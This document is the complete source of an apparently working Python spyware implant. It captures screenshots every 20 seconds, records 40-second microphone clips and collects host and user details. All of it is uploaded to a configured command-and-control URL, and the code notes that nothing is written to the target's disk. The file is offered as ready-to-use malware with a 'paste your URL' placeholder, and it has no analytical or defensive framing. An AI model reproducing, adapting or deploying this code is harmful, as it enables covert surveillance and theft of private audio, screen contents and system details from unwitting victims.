import os
import time
import socket
import platform
import threading
import requests
from datetime import datetime
from io import BytesIO

try:
    from PIL import ImageGrab
    HAS_SCREEN = True
except ImportError:
    HAS_SCREEN = False

try:
    import sounddevice as sd
    import numpy as np
    from scipy.io.wavfile import write as write_wav
    HAS_AUDIO = True
except ImportError:
    HAS_AUDIO = False

# ================== CONFIG ==================
C2_URL = "https://c2-receiver.onrender.com"   # <-- PASTE YOUR RENDER URL
TARGET_ID = socket.gethostname()

SCREEN_INTERVAL = 20
AUDIO_DURATION = 40
AUDIO_INTERVAL = 60
PUSH_INTERVAL = 30

def push_bytes(data, filename, file_type):
    """Upload bytes directly to C2 - nothing written to target disk"""
    try:
        files = {"file": (filename, data)}
        form = {"target_id": TARGET_ID, "file_type": file_type}
        r = requests.post(f"{C2_URL}/upload", files=files, data=form, timeout=60)
        return r.status_code == 200
    except Exception:
        return False

def capture_screen():
    if not HAS_SCREEN:
        return
    while True:
        try:
            img = ImageGrab.grab()
            buf = BytesIO()
            img.save(buf, format="PNG")
            buf.seek(0)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            push_bytes(buf, f"screen_{ts}.png", "screenshots")
        except Exception:
            pass
        time.sleep(SCREEN_INTERVAL)

def record_audio():
    if not HAS_AUDIO:
        return
    while True:
        try:
            rec = sd.rec(int(AUDIO_DURATION * 44100), samplerate=44100, channels=1, dtype="float32")
            sd.wait()
            buf = BytesIO()
            write_wav(buf, 44100, rec)
            buf.seek(0)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            push_bytes(buf, f"audio_{ts}.wav", "audio")
        except Exception:
            pass
        time.sleep(AUDIO_INTERVAL)

def heartbeat():
    while True:
        try:
            requests.post(f"{C2_URL}/ping", data={"target_id": TARGET_ID}, timeout=15)
            info = (
                f"time={datetime.now()}\n"
                f"host={socket.gethostname()}\n"
                f"platform={platform.platform()}\n"
                f"user={os.getenv('USERNAME') or os.getenv('USER')}\n"
            )
            push_bytes(info.encode(), "hostinfo.txt", "logs")
        except Exception:
            pass
        time.sleep(PUSH_INTERVAL)

if __name__ == "__main__":
    threading.Thread(target=capture_screen, daemon=True).start()
    threading.Thread(target=record_audio, daemon=True).start()
    threading.Thread(target=heartbeat, daemon=True).start()
    while True:
        time.sleep(60)
